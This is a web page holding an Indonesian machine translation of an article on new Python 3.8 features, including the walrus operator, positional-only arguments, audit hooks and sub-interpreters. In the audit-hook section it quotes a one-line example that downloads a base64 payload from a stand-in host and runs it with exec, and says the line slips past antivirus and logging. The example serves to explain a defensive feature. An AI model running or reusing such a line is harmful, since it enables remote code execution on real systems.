<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>💊 👵🏿 👨🏻‍🏫 Python 3.8: Apa yang Baru dan Cara Menggunakannya? 🏀 👩🏽‍🤝‍👨🏼 🐶</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Terjemahan berikut telah disiapkan secara khusus untuk pythonists yang tertarik untuk membaca dengan pasti tentang fitur Python 3.8 yang baru. Untuk m...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Python 3.8: Apa yang Baru dan Cara Menggunakannya?</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/otus/blog/472432/">  <i>Terjemahan berikut telah disiapkan secara khusus untuk pythonists yang tertarik untuk membaca dengan pasti tentang fitur Python 3.8 yang baru.</i>  <i>Untuk mengantisipasi peluncuran utas baru pada kursus <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">"Pengembang Python",</a> kami tidak dapat melewati topik ini.</i> <br><br>  Pada artikel ini, kita akan berbicara tentang fitur-fitur baru yang diperkenalkan dengan Python 3.8. <br><br><img src="https://habrastorage.org/webt/i5/rh/vr/i5rhvrl8ymik0j7jswx0gwtr-cq.png"><br><hr><br><h3>  Operator walrus (operator penugasan) </h3><br>  Kami tahu Anda menunggu ini.  Harapan ini tanggal kembali ke hari-hari ketika Python sengaja dilarang menggunakan "=" sebagai operator pembanding.  Beberapa orang menyukai ini karena mereka tidak lagi bingung = dan == dalam tugas dan perbandingan.  Yang lain merasa tidak nyaman untuk mengulangi operator, atau menugaskannya ke variabel.  Mari kita beralih ke contoh. <br><a name="habracut"></a><br>  Menurut Guido, kebanyakan programmer cenderung menulis: <br><br><pre><code class="python hljs">group = re.match(data).group(<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> re.match(data) <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">None</span></span></code> </pre> <br>  Sebaliknya <br><br><pre> <code class="python hljs">match = re.match(data) group = match.group(<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> match <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">None</span></span></code> </pre> <br>  Ini membuat program berjalan lebih lambat.  Meskipun dapat dimengerti mengapa beberapa programmer masih tidak menulis dengan cara pertama - itu mengacaukan kode. <br><br>  Sekarang kita memiliki kesempatan untuk melakukan ini: <br><br><pre> <code class="plaintext hljs">group = match.group(1) if (match := re.match(data)) else None</code> </pre> <br>  Selain itu, berguna saat menggunakan ifs, agar tidak menghitung semuanya terlebih dahulu. <br><br><pre> <code class="python hljs">match1 = pattern1.match(data) match2 = pattern2.match(data) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> match1: result = match1.group(<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> match2: result = match2.group(<span class="hljs-number"><span class="hljs-number">2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: result = <span class="hljs-keyword"><span class="hljs-keyword">None</span></span></code> </pre> <br>  Dan sebagai gantinya, kita dapat menulis: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (match1 := pattern1.match(data)): result = match1.group(<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> (match2 := pattern2.match(data)): result = match2.group(<span class="hljs-number"><span class="hljs-number">2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: result = <span class="hljs-keyword"><span class="hljs-keyword">None</span></span></code> </pre> <br>  Yang lebih optimal, karena yang kedua jika tidak akan dipertimbangkan jika yang pertama berfungsi. <br><br>  Bahkan, saya sangat senang dengan standar PEP-572, karena tidak hanya memberikan peluang yang sebelumnya tidak ada, tetapi juga menggunakan operator yang berbeda untuk ini, sehingga tidak akan mudah untuk membingungkannya dengan ==. <br><br>  Namun, pada saat yang sama, ini juga memberikan peluang baru untuk kesalahan dan pembuatan kode yang sebelumnya tidak beroperasi. <br><br><pre> <code class="python hljs">y0 = (y1 := f(x))</code> </pre> <br><h3>  Argumen posisi </h3><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">f</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(a, b, /, c, d, *, e, f)</span></span></span><span class="hljs-function">:</span></span> print(a, b, c, d, e, f)</code> </pre> <br>  Di sini, semua yang sebelum <code>/</code> hanyalah argumen posisional, dan semuanya setelah <code>*</code> hanyalah kata kunci. <br><br><pre> <code class="python hljs">f(<span class="hljs-number"><span class="hljs-number">10</span></span>, <span class="hljs-number"><span class="hljs-number">20</span></span>, <span class="hljs-number"><span class="hljs-number">30</span></span>, d=<span class="hljs-number"><span class="hljs-number">40</span></span>, e=<span class="hljs-number"><span class="hljs-number">50</span></span>, f=<span class="hljs-number"><span class="hljs-number">60</span></span>) - valid f(<span class="hljs-number"><span class="hljs-number">10</span></span>, b=<span class="hljs-number"><span class="hljs-number">20</span></span>, c=<span class="hljs-number"><span class="hljs-number">30</span></span>, d=<span class="hljs-number"><span class="hljs-number">40</span></span>, e=<span class="hljs-number"><span class="hljs-number">50</span></span>, f=<span class="hljs-number"><span class="hljs-number">60</span></span>) - b cannot be a keyword argument f(<span class="hljs-number"><span class="hljs-number">10</span></span>, <span class="hljs-number"><span class="hljs-number">20</span></span>, <span class="hljs-number"><span class="hljs-number">30</span></span>, <span class="hljs-number"><span class="hljs-number">40</span></span>, <span class="hljs-number"><span class="hljs-number">50</span></span>, f=<span class="hljs-number"><span class="hljs-number">60</span></span>) - e must be a keyword argument</code> </pre> <br>  Lingkup fungsi ini dapat diekspresikan dalam satu kalimat.  Akan lebih mudah bagi perpustakaan untuk mengubah tanda tangan mereka.  Mari kita lihat sebuah contoh: <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">add_to_queue</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(item: QueueItem)</span></span></span><span class="hljs-function">:</span></span></code> </pre> <br>  Sekarang penulis harus mendukung tanda tangan seperti itu, dan nama parameter tidak boleh lagi diubah, karena perubahan ini akan menjadi kritis.  Bayangkan Anda perlu mengubah tidak hanya satu elemen, tetapi seluruh daftar elemen: <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">add_to_queue</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(items: Union[QueueItem, List[QueueItem]])</span></span></span><span class="hljs-function">:</span></span></code> </pre><br>  Atau lebih: <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">add_to_queue</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(*items: QueueItem)</span></span></span><span class="hljs-function">:</span></span></code> </pre> <br>  Ini adalah sesuatu yang tidak dapat Anda lakukan sebelumnya karena kemungkinan tidak kompatibel dengan versi sebelumnya.  Sekarang kamu bisa.  Selain itu, ini lebih konsisten dengan desain yang sudah menggunakan pendekatan ini.  Misalnya, Anda tidak dapat meneruskan kwarg ke fungsi pow. <br><br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span>help(pow) ... pow(x, y, z=<span class="hljs-keyword"><span class="hljs-keyword">None</span></span>, /) ... &gt;&gt;&gt; pow(x=<span class="hljs-number"><span class="hljs-number">5</span></span>, y=<span class="hljs-number"><span class="hljs-number">3</span></span>) Traceback (most recent call last): File <span class="hljs-string"><span class="hljs-string">"&lt;stdin&gt;"</span></span>, line <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> &lt;module&gt; TypeError: pow() takes no keyword arguments</code> </pre> <br><h3>  Debugging dengan f-line </h3><br>  Fungsi tambahan kecil yang membantu kami menggunakan format perekaman yang ringkas dari bentuk "variabel nama =" variabel. <br><br><pre> <code class="python hljs"><span class="hljs-string"><span class="hljs-string">f"</span><span class="hljs-subst"><span class="hljs-string"><span class="hljs-subst">{chr(</span></span><span class="hljs-number"><span class="hljs-string"><span class="hljs-subst"><span class="hljs-number">65</span></span></span></span><span class="hljs-string"><span class="hljs-subst">) = }</span></span></span><span class="hljs-string">"</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"chr(65) = 'A'"</span></span></code> </pre> <br>  Apakah Anda memperhatikan ini setelah chr (65)?  Trik yang sama.  Ini membantu menyediakan cara yang lebih pendek untuk mencetak variabel menggunakan f-line. <br><br><h3>  Cangkang asyncio asli </h3><br>  Sekarang jika kita menjalankan shell Python sebagai 'python -m asyncio', kita tidak perlu lagi <code>asyncio.run()</code> untuk menjalankan fungsi asinkron.  Menunggu dapat digunakan langsung dari shell itu sendiri: <br><br><pre> <code class="python hljs">&gt;python -m asyncio asyncio REPL <span class="hljs-number"><span class="hljs-number">3.8</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span>b4 Use “<span class="hljs-keyword"><span class="hljs-keyword">await</span></span>” directly instead of “asyncio.run()”. Type “help”, “copyright”, “credits” <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> “license” <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> more information. &gt;&gt;&gt; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> asyncio &gt;&gt;&gt; <span class="hljs-keyword"><span class="hljs-keyword">async</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">test</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> … <span class="hljs-keyword"><span class="hljs-keyword">await</span></span> asyncio.sleep(<span class="hljs-number"><span class="hljs-number">1</span></span>) … <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">'hello'</span></span> … &gt;&gt;&gt; <span class="hljs-keyword"><span class="hljs-keyword">await</span></span> test() <span class="hljs-string"><span class="hljs-string">'hello'</span></span></code> </pre> <br><h3>  Python menyebut kait audit runtime </h3><br>  Python Rantime sangat bergantung pada C. Namun, kode yang dieksekusi di dalamnya tidak dicatat atau dilacak dengan cara apa pun.  Ini membuatnya sulit untuk memantau operasi kerangka kerja untuk pengujian, kerangka kerja untuk penebangan, alat keamanan dan, mungkin, membatasi tindakan yang dilakukan oleh runtime. <br><br>  Sekarang Anda dapat mengamati peristiwa yang dipicu oleh runtime, termasuk pengoperasian sistem impor modul dan semua kait pengguna. <br><br>  API baru adalah sebagai berikut: <br><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment"># Add an auditing hook sys.addaudithook(hook: Callable[[str, tuple]]) # Raise an event with all auditing hooks sys.audit(str, *args)</span></span></code> </pre> <br>  Kait tidak dapat dihapus atau diganti.  Untuk CPython, kait yang berasal dari C dianggap global, sedangkan kait yang berasal dari Python hanya untuk juru bahasa saat ini.  Kait global dieksekusi sebelum kait juru bahasa. <br><br>  Satu eksploit yang sangat menarik dan tidak terlacak mungkin terlihat seperti ini: <br><br><pre> <code class="python hljs">python -c “<span class="hljs-keyword"><span class="hljs-keyword">import</span></span> urllib.request, base64; exec(base64.b64decode( urllib.request.urlopen(<span class="hljs-string"><span class="hljs-string">'http://my-exploit/py.b64'</span></span>) ).decode())”</code> </pre> <br>  Kode ini tidak dipindai oleh sebagian besar program antivirus, karena mereka berfokus pada kode yang dapat dikenali yang dibaca saat memuat dan menulis ke disk, dan base64 cukup untuk menyiasati sistem ini.  Kode ini juga akan melewati tingkat keamanan seperti daftar kontrol akses file atau izin (ketika akses file tidak diperlukan), daftar aplikasi tepercaya (dengan asumsi Python memiliki semua izin yang diperlukan), dan audit atau logging otomatis (dengan ketentuan bahwa Python memiliki akses ke Internet atau akses ke mesin lain di jaringan lokal yang dengannya Anda dapat memperoleh payload). <br><br>  Dengan kait acara runtime, kita dapat memutuskan bagaimana merespons peristiwa tertentu.  Kami dapat mendaftarkan acara atau mengakhiri sepenuhnya operasi. <br><br><h3>  multiprocessing.shared_memory </h3><br>  Membantu menggunakan area memori yang sama dari berbagai proses / juru bahasa.  Pada dasarnya, ini dapat membantu kita mengurangi waktu yang diperlukan untuk membuat serialisasi objek untuk mentransfernya di antara proses.  Alih-alih membuat cerita bersambung, mengantri, dan deserialisasi, kita bisa menggunakan memori bersama dari proses lain. <br><br><h3>  Protokol Pickle dan Buffer Data Out-of-Band </h3><br>  Protokol pickle 5 memberikan dukungan untuk buffer out-of-band, di mana data dapat ditransmisikan secara terpisah dari aliran acar utama sesuai kebijakan lapisan transport. <br><br>  2 add-ons sebelumnya sangat penting, tetapi tidak dimasukkan dalam versi rilis Python 3.8, karena masih ada beberapa pekerjaan yang harus dilakukan dengan kompatibilitas dengan kode lama, tetapi ini dapat mengubah pendekatan pemrograman paralel dengan Python. <br><br><h3>  Sub-penerjemah </h3><br>  Utas dalam Python tidak dapat berjalan secara paralel karena GIL, sementara proses membutuhkan banyak sumber daya.  Hanya awal proses yang membutuhkan 100-200 ms, dan mereka juga mengkonsumsi sejumlah besar RAM.  Tetapi sesuatu dapat mengatasinya, dan ini adalah sub-penafsir.  GIL adalah seorang juru bahasa, jadi itu tidak akan mempengaruhi pekerjaan penerjemah lain, dan itu mulai lebih mudah daripada suatu proses (walaupun lebih lambat dari utas). <br><br>  Masalah utama yang muncul dalam hubungan ini adalah transfer data antara penerjemah, karena mereka tidak dapat mentransfer status, seperti aliran.  Karena itu, kita perlu menggunakan semacam koneksi di antara mereka.  Acar, marshal atau json dapat digunakan untuk membuat cerita bersambung dan deserialisasi objek, tetapi metode ini akan bekerja cukup lambat.  Salah satu solusinya adalah menggunakan memori bersama dari modul proses. <br><br>  Subproses tampaknya menjadi solusi yang baik untuk masalah GIL, tetapi kumpulan pekerjaan tertentu masih perlu dilakukan.  Dalam beberapa kasus, Python masih menggunakan "Runtime State" dan bukan "Interpreter State".  Misalnya, pengumpul sampah melakukan hal itu.  Oleh karena itu, Anda perlu melakukan perubahan pada banyak modul internal untuk mulai menggunakan sub-juru secara normal. <br><br>  Saya harap fungsionalitas ini dapat sepenuhnya digunakan di Python versi 3.9. <br><br>  Sebagai kesimpulan, saya ingin mengatakan bahwa gula sintaksis tertentu telah ditambahkan ke versi ini, serta beberapa perbaikan serius dalam pekerjaan perpustakaan dan proses eksekusi.  Namun, banyak fitur menarik yang tidak pernah dirilis, jadi kami akan menunggu mereka di Python 3.9. <br><br><h4>  Sumber: </h4><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Apa yang baru dengan Python</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Operatornya adalah walrus</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Argumen posisi</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Kait audit</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Masalah keamanan tanpa kait audit</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Sub-penerjemah</a> </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id472432/">https://habr.com/ru/post/id472432/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id472420/index.html">Membuat antarmuka lebih responsif berkat Promise yang ditangguhkan</a></li>
<li><a href="../id472422/index.html">Sber X RamblerFront & Meet Up</a></li>
<li><a href="../id472426/index.html">Security Week 43: Kehidupan Rahasia IoT Hanipots</a></li>
<li><a href="../id472428/index.html">Operator kubernet Tarantool</a></li>
<li><a href="../id472430/index.html">Bagaimana kami memilih basis komponen untuk rumah pintar: tentang sensor dan pengontrol</a></li>
<li><a href="../id472434/index.html">Tingkatkan rilis Anda</a></li>
<li><a href="../id472438/index.html">Bagaimana proxy digunakan dalam keamanan informasi: 6 kasus penggunaan praktis</a></li>
<li><a href="../id472440/index.html">Suatu hari di Joker 2019</a></li>
<li><a href="../id472442/index.html">Situasi: semua orang berbicara tentang kembalinya format audio yang terlupakan - mengapa mereka ditakdirkan untuk tetap niche</a></li>
<li><a href="../id472444/index.html">Produk terbaik mulai dari masalah nyata: Interkom tentang Pekerjaan yang akan Dilakukan. Bagian 3 final</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>